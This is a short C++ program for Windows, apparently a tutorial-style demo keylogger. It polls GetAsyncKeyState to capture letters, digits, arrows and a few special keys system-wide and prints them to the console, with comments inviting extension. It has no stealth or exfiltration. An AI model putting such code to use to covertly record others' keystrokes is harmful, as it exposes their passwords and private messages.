#include <iostream>
#include <Windows.h>


// IMPORTANT: either use multithreading or run program when memory usage is not high
void logLetters() {
    
    for (char key = 0x41; key <= 0x5A; key++) {
        SHORT keyPressed = GetAsyncKeyState(key);
        if (keyPressed & 0x8000) {
            std::cout << key;
        }
    }
    if (GetAsyncKeyState(VK_SPACE) & 0x8000) { // most significant bit
        std::cout << " ";
    }

    // this section is for checking special keys, EX: shift, caps lock, etc..
    // I only check 4 special keys, you are free to expand the for loop and check for other special keys, just change VK_CAPITAL to something further in the list https://learn.microsoft.com/en-us/windows/win32/inputdev/virtual-key-codes, (or go back further than VK_BACK).
    for (char specialKey = VK_BACK;  specialKey <= VK_CAPITAL; specialKey++) {
        SHORT specialKeyPress = GetAsyncKeyState(specialKey);
        if (specialKeyPress & 0x8000) {

           if (specialKey == VK_BACK) {
            std::cout << "[BACKSPACE]";

            } else if (specialKey == VK_TAB) {
                std::cout << "[TAB]";

            } else if (specialKey == VK_RETURN) {
                std::cout << "[ENTER]";

            } else if (specialKey == VK_CAPITAL) {
                std::cout << "[CAPS]";
            }
        }
    }
}

void logNumbers(){
    for (char numberPad = 0x30; numberPad <= 0x39; numberPad++) {
        SHORT numpadPressed = GetAsyncKeyState(numberPad);
        if (numpadPressed & 0x8000) {
            std::cout << numberPad;
        }
    }
}

// checks for the arrows pressed, loops from left arrow to down arrow
// we are ONLY checking for four arrows (as there are only four), so you could just do 4 separate if statements instead of this for loop 
void arrows() {
    for (char arrow = 0x25; arrow <= 0x28; arrow++) {
        SHORT arrowPressed = GetAsyncKeyState(arrow);
        if (arrowPressed & 0x8000) {

            if (arrow == VK_LEFT) {
            std::cout << "[LEFT ARROW]";

            } else if (arrow == VK_RIGHT) {
                std::cout << "[RIGHT ARROW]";

            } else if (arrow == VK_UP) {
                std::cout << "[UP ARROW]";

            } else if (arrow == VK_DOWN) {
                std::cout << "[DOWN ARROW]";
            }
        }
    }
}

int main() {
    while (true) {
        logLetters();
        logNumbers();
        arrows();
        Sleep(100); // Sleep for 100 milliseconds to avoid high CPU usage
    }
    return 0;
}
